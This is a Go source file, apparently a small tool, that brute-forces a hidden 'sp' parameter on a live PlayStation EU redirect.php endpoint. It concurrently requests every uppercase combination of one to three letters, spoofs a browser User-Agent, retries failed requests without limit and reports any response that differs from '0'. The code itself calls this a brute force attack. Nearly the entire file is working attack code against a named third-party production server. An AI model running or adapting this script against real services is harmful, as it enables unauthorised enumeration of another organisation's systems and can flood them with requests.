package brute

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

var liveURL = "http://ps20.software.eu.playstation.com/redirect.php"
var testURL = "http://localhost:4010/redirect.php"
var httpHeaders = map[string]string{
	"User-Agent": "Mozilla/5.0 " +
		"(Macintosh; Intel Mac OS X 10.10; rv:34.0) " +
		"Gecko/20100101 Firefox/34.0",
}

var alphabet = []string{
	// "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n",
	// "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
	"O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
	// "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
}

var attempts = len(alphabet) +
	(len(alphabet) * len(alphabet)) +
	(len(alphabet) * len(alphabet) * len(alphabet))

type msg struct {
	Type string
	Body string
}

func printer(total int, notif chan msg) {
	count := 0

	for msg := range notif {
		if msg.Type == "incr" {
			count++
			fmt.Printf("\r\033[2\rK%d/%d", count, total)
			if count == total {
				fmt.Println("")
				return
			}
		} else if msg.Type == "print" {
			fmt.Print("\033[2K\r")
			fmt.Println(msg.Body)
		}
	}
}

func finder(url string, seed string, notif chan msg) {
	reqURL := url + "?sp=" + seed
	tryURL(reqURL, notif)

	for _, second := range alphabet {
		reqURL := url + "?sp=" + seed + second
		tryURL(reqURL, notif)

		for _, third := range alphabet {
			reqURL := url + "?sp=" + seed + second + third
			tryURL(reqURL, notif)
		}
	}
}

func tryURL(url string, notif chan msg) {
	response := httpGet(url)
	notif <- msg{Type: "incr"}

	if response != "0" {
		notif <- msg{
			Type: "print",
			Body: "Found: " + url + " = " + response,
		}
	}

}

func httpGet(url string) string {
	client := &http.Client{}

	req, _ := http.NewRequest("GET", url, nil)

	for header, value := range httpHeaders {
		req.Header.Add(header, value)
	}

	response, err := client.Do(req)
	body := ""

	if err != nil {
		body = httpGet(url)
	} else {
		defer response.Body.Close()
		content, err := ioutil.ReadAll(response.Body)
		if err != nil {
			body = string(httpGet(url))
		}
		body = string(content)
	}

	return body
}

// Do initiates the brute force attack.
func Do() {
	var url string
	if os.Getenv("TEST") == "" {
		url = liveURL
	} else {
		url = testURL
	}

	notif := make(chan msg)

	for _, seed := range alphabet {
		go finder(url, seed, notif)
	}

	printer(attempts, notif)
}
